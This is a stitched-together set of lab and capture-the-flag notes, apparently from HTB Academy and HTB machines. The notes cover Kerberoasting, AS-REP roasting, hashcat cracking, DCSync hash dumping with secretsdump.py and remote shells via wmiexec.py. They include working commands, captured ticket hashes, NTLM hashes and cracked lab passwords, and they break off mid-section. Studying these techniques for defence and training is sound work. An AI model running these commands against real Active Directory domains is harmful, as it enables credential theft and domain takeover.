$krb5tgs$23$*SOLARWINDSMONITOR$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/SOLARWINDSMONITOR*$993de7a8296f2a3f2fa41badec4215e1$d0fb2166453e4f2483735b9005e15667dbfd40fc9f8b5028e4b510fc570f5086978371ecd81ba6790b3fa7ff9a007ee9040f0566f4aed3af45ac94bd884d7b20f87d45b51af83665da67fb394a7c2b345bff2dfe7fb72836bb1a43f12611213b19fdae584c0b8114fb43e2d81eeee2e2b008e993c70a83b79340e7f0a6b6a1dba9fa3c9b6b02adde8778af9ed91b2f7fa85dcc5d858307f1fa44b75f0c0c80331146dfd5b9c5a226a68d9bb0a07832cc04474b9f4b4340879b69e0c4e3b6c0987720882c6bb6a52c885d1b79e301690703311ec846694cdc14d8a197d8b20e42c64cc673877c0b70d7e1db166d575a5eb883f49dfbd2b9983dd7aab1cff6a8c5c32c4528e798237e837ffa1788dca73407aac79f9d6f74c6626337928457e0b6bbf666a0778c36cba5e7e026a177b82ed2a7e119663d6fe9a7a84858962233f843d784121147ef4e63270410640903ea261b04f89995a12b42a223ed686a4c3dcb95ec9b69d12b343231cccfd29604d6d777939206df4832320bdd478bda0f1d262be897e2dcf51be0a751490350683775dd0b8a175de4feb6cb723935f5d23f7839c08351b3298a6d4d8530853d9d4d1e57c9b220477422488c88c0517fb210856fb603a9b53e734910e88352929acc00f82c4d8f1dd783263c04aff6061fb26f3b7a475536f8c0051bd3993ed24ff22f58f7ad5e0e1856a74967e70c0dd511cc52e1d8c2364302f4ca78d6750aec81dfdea30c298126987b9ac867d6269351c41761134bc4be67a8b7646935eb94935d4121161de68aac38a740f09754293eacdba7dfe26ace6a4ea84a5b90d48eb9bb3d5766827d89b4650353e87d2699da312c6d0e1e26ec2f46f3077f13825764164368e26d58fc55a358ce979865cc57d4f34691b582a3afc18fe718f8b97c44d0b812e5deeed444d665e847c5186ad79ae77a5ed6efab1ed9d863edb36df1a5cd4abdbf7f7e872e3d5fa0bf7735348744d4fc048211c2e7973839962e91db362e5338da59bc0078515a513123d6c5537974707bdc303526437b4a4d3095d1b5e0f2d9db1658ac2444a11b59ddf2761ce4c1e5edd92bcf5cbd8c230cb4328ff2d0e2813b4654116b4fda929a38b69e3f9283e4de7039216f18e85b9ef1a59087581c758efec16d948accc909324e94cad923f2487fb2ed27294329ed314538d0e0e75019d50bcf410c7edab6ce11401adbaf5a3a009ab304d9bdcb0937b4dcab89e90242b7536644677c62fd03741c0b9d090d8fdf0c856c36103aedfd6c58e7064b07628b58c3e086a685f70a1377f53c42ada3cb7bb4ba0a69085dec77f4b7287ca2fb2da9bcbedc39f50586bfc9ec0ac61b687043afa239a46e6b20aacb7d5d8422d5cacc02df18fea3be0c0aa0d83e7982fc225d9e6a2886dc223f6a6830f71dabae21ff38e1722048b5788cd23ee2d6480206df572b6ba2acfe1a5ff6bee8812d585eeb4bc8efce92fd81aa0a9b57f37bf3954c26afc98e15c5c90747948d6008c80b620a1ec54ded2f3073b4b09ee5cc233bf7368427a6af0b1cb1276ebd85b45a30

<SNIP>
```

We can also be more targeted and request just the TGS ticket for a specific account. Let's try requesting one for just the `sqldev` account.

#### Requesting a Single TGS ticket

  Kerberoasting - from Linux

```shell-session
trmchale@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev

Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                           Name    MemberOf                                             PasswordLastSet             LastLogon  Delegation 
---------------------------------------------  ------  ---------------------------------------------------  --------------------------  ---------  ----------
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:13:31.639334  <never>               



$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/sqldev*$4ce5b71188b357b26032321529762c8a$1bdc5810b36c8e485ba08fcb7ab273f778115cd17734ec65be71f5b4bea4c0e63fa7bb454fdd5481e32f002abff9d1c7827fe3a75275f432ebb628a471d3be45898e7cb336404e8041d252d9e1ebef4dd3d249c4ad3f64efaafd06bd024678d4e6bdf582e59c5660fcf0b4b8db4e549cb0409ebfbd2d0c15f0693b4a8ddcab243010f3877d9542c790d2b795f5b9efbcfd2dd7504e7be5c2f6fb33ee36f3fe001618b971fc1a8331a1ec7b420dfe13f67ca7eb53a40b0c8b558f2213304135ad1c59969b3d97e652f55e6a73e262544fe581ddb71da060419b2f600e08dbcc21b57355ce47ca548a99e49dd68838c77a715083d6c26612d6c60d72e4d421bf39615c1f9cdb7659a865eecca9d9d0faf2b77e213771f1d923094ecab2246e9dd6e736f83b21ee6b352152f0b3bbfea024c3e4e5055e714945fe3412b51d3205104ba197037d44a0eb73e543eb719f12fd78033955df6f7ebead5854ded3c8ab76b412877a5be2e7c9412c25cf1dcb76d854809c52ef32841269064661931dca3c2ba8565702428375f754c7f2cada7c2b34bbe191d60d07111f303deb7be100c34c1c2c504e0016e085d49a70385b27d0341412de774018958652d80577409bff654c00ece80b7975b7b697366f8ae619888be243f0e3237b3bc2baca237fb96719d9bc1db2a59495e9d069b14e33815cafe8a8a794b88fb250ea24f4aa82e896b7a68ba3203735ec4bca937bceac61d31316a43a0f1c2ae3f48cbcbf294391378ffd872cf3721fe1b427db0ec33fd9e4dfe39c7cbed5d70b7960758a2d89668e7e855c3c493def6aba26e2846b98f65b798b3498af7f232024c119305292a31ae121a3472b0b2fcaa3062c3d93af234c9e24d605f155d8e14ac11bb8f810df400604c3788e3819b44e701f842c52ab302c7846d6dcb1c75b14e2c9fdc68a5deb5ce45ec9db7318a80de8463e18411425b43c7950475fb803ef5a56b3bb9c062fe90ad94c55cdde8ec06b2e5d7c64538f9c0c598b7f4c3810ddb574f689563db9591da93c879f5f7035f4ff5a6498ead489fa7b8b1a424cc37f8e86c7de54bdad6544ccd6163e650a5043819528f38d64409cb1cfa0aeb692bdf3a130c9717429a49fff757c713ec2901d674f80269454e390ea27b8230dec7fffb032217955984274324a3fb423fb05d3461f17200dbef0a51780d31ef4586b51f130c864db79796d75632e539f1118318db92ab54b61fc468eb626beaa7869661bf11f0c3a501512a94904c596652f6457a240a3f8ff2d8171465079492e93659ec80e2027d6b1865f436a443b4c16b5771059ba9b2c91e871ad7baa5355d5e580a8ef05bac02cf135813b42a1e172f873bb4ded2e95faa6990ce92724bcfea6661b592539cd9791833a83e6116cb0ea4b6db3b161ac7e7b425d0c249b3538515ccfb3a993affbd2e9d247f317b326ebca20fe6b7324ffe311f225900e14c62eb34d9654bb81990aa1bf626dec7e26ee2379ab2f30d14b8a98729be261a5977fefdcaaa3139d4b82a056322913e7114bc133a6fc9cd74b96d4d6a2
```

With this ticket in hand, we could attempt to crack the user's password offline using Hashcat. If we are successful, we may end up with Domain Admin rights.

To facilitate offline cracking, it is always good to use the `-outputfile` flag to write the TGS tickets to a file that can then be run using Hashcat on our attack system or moved to a GPU cracking rig.

#### Saving the TGS Ticket to an Output File

  Kerberoasting - from Linux

```shell-session
trmchale@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs

Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation

Password:
ServicePrincipalName                           Name    MemberOf                                             PasswordLastSet             LastLogon  Delegation 
---------------------------------------------  ------  ---------------------------------------------------  --------------------------  ---------  ----------
MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433  sqldev  CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL  2022-02-15 17:13:31.639334  <never>  
```

Here we've written the TGS ticket for the `sqldev` user to a file named `sqldev_tgs`. Now we can attempt to crack the ticket offline using Hashcat hash mode `13100`.

#### Cracking the Ticket Offline with Hashcat

  Kerberoasting - from Linux

```shell-session
trmchale@htb[/htb]$ hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 

hashcat (v6.1.1) starting...

<SNIP>

$krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$INLANEFREIGHT.LOCAL/sqldev*$81f3efb5827a05f6ca196990e67bf751$f0f5fc941f17458eb17b01df6eeddce8a0f6b3c605112c5a71d5f66b976049de4b0d173100edaee42cb68407b1eca2b12788f25b7fa3d06492effe9af37a8a8001c4dd2868bd0eba82e7d8d2c8d2e3cf6d8df6336d0fd700cc563c8136013cca408fec4bd963d035886e893b03d2e929a5e03cf33bbef6197c8b027830434d16a9a931f748dede9426a5d02d5d1cf9233d34bb37325ea401457a125d6a8ef52382b94ba93c56a79f78cb26ffc9ee140d7bd3bdb368d41f1668d087e0e3b1748d62dfa0401e0b8603bc360823a0cb66fe9e404eada7d97c300fde04f6d9a681413cc08570abeeb82ab0c3774994e85a424946def3e3dbdd704fa944d440df24c84e67ea4895b1976f4cda0a094b3338c356523a85d3781914fc57aba7363feb4491151164756ecb19ed0f5723b404c7528ebf0eb240be3baa5352d6cb6e977b77bce6c4e483cbc0e4d3cb8b1294ff2a39b505d4158684cd0957be3b14fa42378842b058dd2b9fa744cee4a8d5c99a91ca886982f4832ad7eb52b11d92b13b5c48942e31c82eae9575b5ba5c509f1173b73ba362d1cde3bbd5c12725c5b791ce9a0fd8fcf5f8f2894bc97e8257902e8ee050565810829e4175accee78f909cc418fd2e9f4bd3514e4552b45793f682890381634da504284db4396bd2b68dfeea5f49e0de6d9c6522f3a0551a580e54b39fd0f17484075b55e8f771873389341a47ed9cf96b8e53c9708ca4fc134a8cf38f05a15d3194d1957d5b95bb044abbb98e06ccd77703fa5be4aacc1a669fe41e66b69406a553d90efe2bb43d398634aff0d0b81a7fd4797a953371a5e02e25a2dd69d16b19310ac843368e043c9b271cab112981321c28bfc452b936f6a397e8061c9698f937e12254a9aadf231091be1bd7445677b86a4ebf28f5303b11f48fb216f9501667c656b1abb6fc8c2d74dc0ce9f078385fc28de7c17aa10ad1e7b96b4f75685b624b44c6a8688a4f158d84b08366dd26d052610ed15dd68200af69595e6fc4c76fc7167791b761fb699b7b2d07c120713c7c797c3c3a616a984dbc532a91270bf167b4aaded6c59453f9ffecb25c32f79f4cd01336137cf4eee304edd205c0c8772f66417325083ff6b385847c6d58314d26ef88803b66afb03966bd4de4d898cf7ce52b4dd138fe94827ca3b2294498dbc62e603373f3a87bb1c6f6ff195807841ed636e3ed44ba1e19fbb19bb513369fca42506149470ea972fccbab40300b97150d62f456891bf26f1828d3f47c4ead032a7d3a415a140c32c416b8d3b1ef6ed95911b30c3979716bda6f61c946e4314f046890bc09a017f2f4003852ef1181cec075205c460aea0830d9a3a29b11e7c94fffca0dba76ba3ba1f0577306555b2cbdf036c5824ccffa1c880e2196c0432bc46da9695a925d47febd3be10104dd86877c90e02cb0113a38ea4b7e4483a7b18b15587524d236d5c67175f7142cc75b1ba05b2395e4e85262365044d272876f500cb511001850a390880d824aec2c452c727beab71f56d8189440ecc3915c148a38eac06dbd27fe6817ffb1404c1f:database!
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, TGS-REP
Hash.Target......: $krb5tgs$23$*sqldev$INLANEFREIGHT.LOCAL$INLANEFREIG...404c1f
Time.Started.....: Tue Feb 15 17:45:29 2022, (10 secs)
Time.Estimated...: Tue Feb 15 17:45:39 2022, (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   821.3 kH/s (11.88ms) @ Accel:64 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 8765440/14344386 (61.11%)
Rejected.........: 0/8765440 (0.00%)
Restore.Point....: 8749056/14344386 (60.99%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: davius07 -> darten170

Started: Tue Feb 15 17:44:49 2022
Stopped: Tue Feb 15 17:45:41 2022
```

We've successfully cracked the user's password as `database!`. As the last step, we can confirm our access and see that we indeed have Domain Admin rights as we can authenticate to the target DC in the INLANEFREIGHT.LOCAL domain. From here, we could perform post-exploitation and continue to enumerate the domain for other paths to compromise and other notable flaws and misconfigurations.

#### Testing Authentication against a Domain Controller

  Kerberoasting - from Linux

```shell-session
trmchale@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\sqldev:database! (Pwn3d!
```

---

## What is DCSync and How Does it Work?

DCSync is a technique for stealing the Active Directory password database by using the built-in `Directory Replication Service Remote Protocol`, which is used by Domain Controllers to replicate domain data. This allows an attacker to mimic a Domain Controller to retrieve user NTLM password hashes.

The crux of the attack is requesting a Domain Controller to replicate passwords via the `DS-Replication-Get-Changes-All` extended right. This is an extended access control right within AD, which allows for the replication of secret data.

To perform this attack, you must have control over an account that has the rights to perform domain replication (a user with the Replicating Directory Changes and Replicating Directory Changes All permissions set). Domain/Enterprise Admins and default domain administrators have this right by default.

#### Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py

  DCSync

```shell-session
trmchale@htb[/htb]$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 

Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation

Password:
[*] Target system bootKey: 0x0e79d2e5d9bad2639da4ef244b30fda5
[*] Searching for NTDS.dit
[*] Registry says NTDS.dit is at C:\Windows\NTDS\ntds.dit. Calling vssadmin to get a copy. This might take some time
[*] Using smbexec method for remote execution
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: a9707d46478ab8b3ea22d8526ba15aa6
[*] Reading and decrypting hashes from \\172.16.5.5\ADMIN$\Temp\HOLJALFD.tmp 
inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::
guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
lab_adm:1001:aad3b435b51404eeaad3b435b51404ee:663715a1a8b957e8e9943cc98ea451b6:::
ACADEMY-EA-DC01$:1002:aad3b435b51404eeaad3b435b51404ee:13673b5b66f699e81b2ebcb63ebdccfb:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:16e26ba33e455a8c338142af8d89ffbc:::
ACADEMY-EA-MS01$:1107:aad3b435b51404eeaad3b435b51404ee:06c77ee55364bd52559c0db9b1176f7a:::
ACADEMY-EA-WEB01$:1108:aad3b435b51404eeaad3b435b51404ee:1c7e2801ca48d0a5e3d5baf9e68367ac:::
inlanefreight.local\htb-student:1111:aad3b435b51404eeaad3b435b51404ee:2487a01dd672b583415cb52217824bb5:::
inlanefreight.local\avazquez:1112:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::

<SNIP>

d0wngrade:des-cbc-md5:d6fee0b62aa410fe
d0wngrade:dec-cbc-crc:d6fee0b62aa410fe
ACADEMY-EA-FILE$:des-cbc-md5:eaef54a2c101406d
svc_qualys:des-cbc-md5:f125ab34b53eb61c
forend:des-cbc-md5:e3c14adf9d8a04c1
[*] ClearText password from \\172.16.5.5\ADMIN$\Temp\HOLJALFD.tmp 
proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
[*] Cleaning up...
```

We can use the `-just-dc-ntlm` flag if we only want NTLM hashes or specify `-just-dc-user <USERNAME>` to only extract data for a specific user. Other useful options include `-pwd-last-set` to see when each account's password was last changed and `-history` if we want to dump password history, which may be helpful for offline password cracking or as supplemental data on domain password strength metrics for our client. The `-user-status` is another helpful flag to check and see if a user is disabled. We can dump the NTDS data with this flag and then filter out disabled users when providing our client with password cracking statistics to ensure that data such as:

- Number and % of passwords cracked
- top 10 passwords
- Password length metrics
- Password re-use

reflect only active user accounts in the domain.


Get users for the domain `SVC_TGS`:

```
GetADUsers.py -all active.htb/svc_tgs -dc-ip 10.10.10.100

Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra
```

Kerberos authentication uses Service Principal Names (SPNs) to identify the account associated with a particular service instance. ldapsearch can be used to identify accounts that are configured with SPNs.

We reuse the previous query and add a filter to catch SPNs, (serviceprincipalname=*/*) :

```
ldapsearch -x -H 'ldap://10.10.10.100' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b
"dc=active,dc=htb" -s sub "(&(objectCategory=person)(objectClass=user)(!
(useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))"
serviceprincipalname | grep -B 1 servicePrincipalName

dn: CN=Administrator,CN=Users,DC=active,DC=htb
servicePrincipalName: active/CIFS:445
```

It seems that the active\Administrator account has been configured with an SPN. Impacket’s GetUserSPNs.py lets us request the TGS and extract the hash for offline cracking.

```
GetUserSPNs.py active.htb/svc_tgs -dc-ip 10.10.10.100
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

Password: GPPstillStandingStrong2k18
SPN              Name           MemberOf
---------------  -------------  ---------------------------------------------------
active/CIFS:445   Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb
<...SNIP....>

Password: GPPstillStandingStrong2k18
<...SNIP...>
[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$73fd1c3cdfb6f1085f60218dc0
5d9b90$d8728890eed6dbfd4c7ac4a90d432af56e5ceb9cdb82c3ed943d64bca639c46f67c9e2892eae6b84fad
ce3215f550ba9aac436212ecdc0cdf93adc5a33547f31907bd79d4ec8826063cd18e07493eb7eb5b1a1efe1f53
08308489f2e101432ac40a6969861ff1c93fdec9ae1abb1b237c59bb866dcc7d028297f75e3110436dc5446f3f
8d36ec58b780384b0f6c02a6f1b76e283d3ed00dcc4a69061d5e02119cb79671e17ffce51cac8967606d2b0140
77c52064ccaf42ee7d2465818d56f12bc2daa2910e92740ebeaf78cd574a3919fabb04ae86f0c93b82e05e41d5
8b1d83d85407a9577823b30125d270e4dcec1dd0c4faa4eb87fd5110c281b9cfb1f5844507421984935eb63109
88319aaeb0b0d4e91849f4e6a15c9f024558b0e982d056d8ce3fcb5eea8a5eca7db51612ae1dfba0770a54e43a
79e5af5daa4366b8c752f6f8b060de90d4c5e21d473b503f4503a26cd3834400fd19141821244862a1d65e139a
d0640aa26478638c87dc715120cb8e2bb7e4d51ac21802d3b26c1d6207022c071fe9361c0c9b96767cd9bb0ce3
c3c3fe48fa0157f4fdd7a56fda7af540ed565eefd58c7ca7f8e5cae13333695897dd3acc01eee8d7870f55955e
3fc7a5946a61424e6dd5c243abfe11716dbc2e2ca435949c5f49feb9582b7a9d2eae6f7d9aa720b786468ce6ec
7ef5b879c764e59574de70345aa79898eb26d09bb6dd3e2e8b87e96ee60cb9dbde6365a201ae307698c162ea72
41f22b964960b1916b9fcb5e1981f5fd02ed0590a9862eb3a6b5e9a14cb99c3bfb72abfd4a7faef5766ac9f05f
aff37860acb0c00cfd90d2cda321a12f3dd08ffd1a36dbd8452d5ee92f0e90f9d78c6b8228ed333984d717cc99
26a8751d7ed0c14fde671f8413c361e72a48472acffa25fc931b4db96224f14427251662a4b934190bb215e8c0
727958432cb751dd8bf81c2dcdeeb355f45b0faf80388abac80c9cabfa7ce6a7ddf36c7fa2d02c5b168d00ce72
9e555f1cba3ad455d5dfb7c8360d5c1b021a3549065eceda11e0f109c9fed1720e2a2e3a111715698c60480aae
043501b35f527fe353a4c9a03ff46c6e438e411bbcfa3ea8ee3e8fbee38d464a43304a9a0607076748a19ff94b
6ad704674f6d8a0f29a9575a4b121b1143f8376ffc98dbce58589ec356deb592808052d530baa49c3ae5af846a
9b4047ce682f7473703c5dd1d8cf585eab3082e00cfaf23289dbffa1925ba26e41c3ba7e682cb
```

#### Cracking of Kerberos TGS Hash

We use hashcat with the rockyou.txt wordlist to crack the hash and obtain the active\administrator password of Ticketmaster1968 .

```
hashcat -m 13100 hash /usr/share/wordlists/rockyou.txt --force --potfile-disable
hashcat (v6.1.1) starting...

<...SNIP...>
Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 2 secs

$krb5tgs$23$*Administrator$ACTIVE.HTB$<...SNIP...>:Ticketmaster1968
<...SNIP...>
Started: Mon Nov 27 12:18:48 2023
```

Impacket’s wmiexec.py can be used to get a shell as active\administrator , and read root.txt .

```
wmiexec.py active.htb/administrator:Ticketmaster1968@10.10.10.100
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] SMBv2.1 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
active\administrator
```

##### Notes from HTB Labs:

##### Active

root@kali# GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out

root@kali# cat GetUserSPNs.out $krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$7028f37607953ce9fd6c9060de4aece5$55e2d21e37623a43d8cd5e36e39bfaffc52abead3887ca728d527874107ca042e0e9283ac478b1c91cab58c9184828e7a5e0af452ad2503e463ad2088ba97964f65ac10959a3826a7f99d2d41e2a35c5a2c47392f160d65451156893242004cb6e3052854a9990bac4deb104f838f3e50eca3ba770fbed089e1c91c513b7c98149af2f9a994655f5f13559e0acb003519ce89fa32a1dd1c8c7a24636c48a5c948317feb38abe54f875ffe259b6b25a63007798174e564f0d6a09479de92e6ed98f0887e19b1069b30e2ed8005bb8601faf4e476672865310c6a0ea0bea1ae10caff51715aea15a38fb2c1461310d99d6916445d7254f232e78cf9288231e436ab457929f50e6d4f70cbfcfd2251272961ff422c3928b0d702dcb31edeafd856334b64f74bbe486241d752e4cf2f6160b718b87aa7c7161e95fab757005e5c80254a71d8615f4e89b0f4bd51575cc370e881a570f6e5b71dd14f50b8fd574a04978039e6f32d108fb4207d5540b4e58df5b8a0a9e36ec2d7fc1150bb41eb9244d96aaefb36055ebcdf435a42d937dd86b179034754d2ac4db28a177297eaeeb86c229d0f121cf04b0ce32f63dbaa0bc5eafd47bb97c7b3a14980597a9cb2d83ce7c40e1b864c3b3a77539dd78ad41aceb950a421a707269f5ac25b27d5a6b7f334d37acc7532451b55ded3fb46a4571ac27fc36cfad031675a85e0055d31ed154d1f273e18be7f7bc0c810f27e9e7951ccc48d976f7fa66309355422124ce6fda42f9df406563bc4c20d9005ba0ea93fac71891132113a15482f3d952d54f22840b7a0a6000c8e8137e04a898a4fd1d87739bf5428d748086f0166b35c181729cc62b41ba6a9157333bb77c9e03dc9ac23782cf5dcebd11faad8ca3e3e74e25f21dc04ba9f1703bd51d100051c8f505cc8085056b94e349b57906ee8deaf026b3daa89e7c3fc747a6a31ae08376da259f3118370bef86b6e7c2f88d66400eccb122dec8028223f6dcde29ffaa5b83ecb1c3780a782a5797c527a26a7b51b62db3e4865ebc2a0a0d2c931550decb3e7ae581b59f070dd33e423a90ec2ef66982a1b6336afe968fa93f5dd2880a313dc05d4e5cf104b6d9a8316b9fe3dc16e057e0f5c835e111ab92795fb0033541916a57df8f8e6b8cc25ecff2775282ccee110c49376c2cec6b7bb95c265f1466994da89e69605594ead28d24212a137ee20197d8aa95f243c347e02616f40f4071c33f749f5b94d1259fd32174

$ hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force hashcat (v4.0.1) starting... ...snip... $krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$7028f37607953ce9fd6c9060de4aece5$55e2d21e37623a43d8cd5e36e39bfaffc52abead3887ca728d527874107ca042e0e9283ac478b1c91cab58c9 184828e7a5e0af452ad2503e463ad2088ba97964f65ac10959a3826a7f99d2d41e2a35c5a2c47392f160d65451156893242004cb6e3052854a9990bac4deb104f838f3e50eca3ba770fbed089e1c91c513b7c98149af2f9a 994655f5f13559e0acb003519ce89fa32a1dd1c8c7a24636c48a5c948317feb38abe54f875ffe259b6b25a63007798174e564f0d6a09479de92e6ed98f0887e19b1069b30e2ed8005bb8601faf4e476672865310c6a0ea0b ea1ae10caff51715aea15a38fb2c1461310d99d6916445d7254f232e78cf9288231e436ab457929f50e6d4f70cbfcfd2251272961ff422c3928b0d702dcb31edeafd856334b64f74bbe486241d752e4cf2f6160b718b87aa 7c7161e95fab757005e5c80254a71d8615f4e89b0f4bd51575cc370e881a570f6e5b71dd14f50b8fd574a04978039e6f32d108fb4207d5540b4e58df5b8a0a9e36ec2d7fc1150bb41eb9244d96aaefb36055ebcdf435a42d 937dd86b179034754d2ac4db28a177297eaeeb86c229d0f121cf04b0ce32f63dbaa0bc5eafd47bb97c7b3a14980597a9cb2d83ce7c40e1b864c3b3a77539dd78ad41aceb950a421a707269f5ac25b27d5a6b7f334d37acc7 532451b55ded3fb46a4571ac27fc36cfad031675a85e0055d31ed154d1f273e18be7f7bc0c810f27e9e7951ccc48d976f7fa66309355422124ce6fda42f9df406563bc4c20d9005ba0ea93fac71891132113a15482f3d952 d54f22840b7a0a6000c8e8137e04a898a4fd1d87739bf5428d748086f0166b35c181729cc62b41ba6a9157333bb77c9e03dc9ac23782cf5dcebd11faad8ca3e3e74e25f21dc04ba9f1703bd51d100051c8f505cc8085056b 94e349b57906ee8deaf026b3daa89e7c3fc747a6a31ae08376da259f3118370bef86b6e7c2f88d66400eccb122dec8028223f6dcde29ffaa5b83ecb1c3780a782a5797c527a26a7b51b62db3e4865ebc2a0a0d2c931550de cb3e7ae581b59f070dd33e423a90ec2ef66982a1b6336afe968fa93f5dd2880a313dc05d4e5cf104b6d9a8316b9fe3dc16e057e0f5c835e111ab92795fb0033541916a57df8f8e6b8cc25ecff2775282ccee110c49376c2c ec6b7bb95c265f1466994da89e69605594ead28d24212a137ee20197d8aa95f243c347e02616f40f4071c33f749f5b94d1259fd32174:Ticketmaster1968
```

So the above were two commands, the first used the Impacket script `GetUserSPNs.py` to find users, in this case we found Administrator. We cat the `GetUserSPNs.out` file, finding a long hash. Then I decrypted it with `hashcat`, getting the password `Ticketmaster1968`.
```

##### Forest

After running a basic `nmap` search, I see that `ldap` is running on port 389.

I run an `ldap` search to see what I find:

```
ldapsearch -h {target ip} 389 -x -s base -b ‘’ “(objectClass=*)” “*” +
```

I get the domain `htb.local`.

After probing several different paths via `smb`, and not getting in, I try `rpc` on port 445.

```
rpcclient -U "" -N {target ip}
rpcclient $> enumdomusers

user:[Administrator] rid:[0x1f4]       
user:[Guest] rid:[0x1f5]               
user:[krbtgt] rid:[0x1f6]              
user:[DefaultAccount] rid:[0x1f7]      
user:[$331000-VK4ADACQNUCA] rid:[0x463]
user:[SM_2c8eef0a09b545acb] rid:[0x464]
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]
user:[SM_75a538d3025e4db9a] rid:[0x466]
user:[SM_681f53d4942840e18] rid:[0x467]
user:[SM_1b41c9286325456bb] rid:[0x468]
user:[SM_9b69f1b9d2cc45549] rid:[0x469]
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]
user:[HealthMailboxc0a90c9] rid:[0x470]
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]
user:[sebastien] rid:[0x479]
user:[lucinda] rid:[0x47a]
user:[svc-alfresco] rid:[0x47b]  
user:[andy] rid:[0x47e]                
user:[mark] rid:[0x47f]                
user:[santi] rid:[0x480]
```

I create a users list with the following users:

```
root@kali# cat users 
Administrator 
andy 
lucinda 
mark 
santi 
sebastien 
svc-alfresco

root@kali# for user in $(cat users); do GetNPUsers.py -no-pass -dc-ip 10.10.10.161 htb/${user} | grep -v Impacket; done

...


[*] Getting TGT for svc-alfresco
$krb5asrep$23$svc-alfresco@HTB:c213afe360b7bcbf08a522dcb423566c$d849f59924ba2b5402b66ee1ef332c2c827c6a5f972c21ff329d7c3f084c8bc30b3f9a72ec9db43cba7fc47acf0b8e14c173b9ce692784b47ae494a4174851ae3fcbff6f839c833d3740b0e349f586cdb2a3273226d183f2d8c5586c25ad350617213ed0a61df199b0d84256f953f5cfff19874beb2cd0b3acfa837b1f33d0a1fc162969ba335d1870b33eea88b510bbab97ab3fec9013e33e4b13ed5c7f743e8e74eb3159a6c4cd967f2f5c6dd30ec590f63d9cc354598ec082c02fd0531fafcaaa5226cbf57bfe70d744fb543486ac2d60b05b7db29f482355a98aa65dff2f
```

I get the hash above for the user `svc-alfresco`.

I use hashcat to break the hash.

```
